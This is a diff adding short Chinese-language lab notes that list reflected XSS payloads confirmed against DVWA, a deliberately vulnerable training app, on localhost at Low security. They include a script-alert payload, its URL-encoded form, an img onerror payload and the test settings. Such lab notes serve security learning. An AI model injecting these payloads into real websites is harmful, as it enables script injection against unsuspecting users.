@@ -1,0 +1,16 @@
+# DVWA (Low) 反射型 XSS 测试成功的 Payload
+
+## 基础 Payload
+<script>alert(1)</script>
+
+## URL 编码后的 Payload (Burp 自动编码)
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+## 另一种常用测试 Payload
+<img src=x onerror=alert('XSS')>
+
+## 测试环境信息
+- 目标: http://localhost/DVWA/vulnerabilities/xss_r/
+- 安全等级: Low
+- 状态码: 200 OK
+- Cookie: security=low
